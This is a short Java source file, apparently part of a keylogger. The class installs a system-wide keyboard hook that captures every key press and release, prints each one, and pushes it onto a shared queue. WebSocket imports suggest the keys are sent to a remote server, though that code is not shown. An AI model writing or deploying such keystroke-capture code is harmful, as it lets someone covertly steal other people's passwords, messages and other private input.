package org.example;
import dyorgio.runtime.jinputhook.GlobalKeyListener;
import dyorgio.runtime.jinputhook.JInputHook;
import net.java.games.input.Component.Identifier.Key;

import javax.websocket.ContainerProvider;
import javax.websocket.WebSocketContainer;
import java.net.URI;
import java.util.ArrayDeque;
import java.util.Queue;

public class luong1 implements Runnable{


    @Override
    public void run() {
        try {
            JInputHook.initialize();

            JInputHook.addListener(new GlobalKeyListener() {
                @Override
                public void keyPressed(Key key) {
                    System.out.print(key);
                    Global.q.add(key.toString());

                }

                @Override
                public void keyReleased(Key key) {
                    System.out.print(key);
                    Global.q.add(key.toString());
                }
            });
            while (true);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }
}
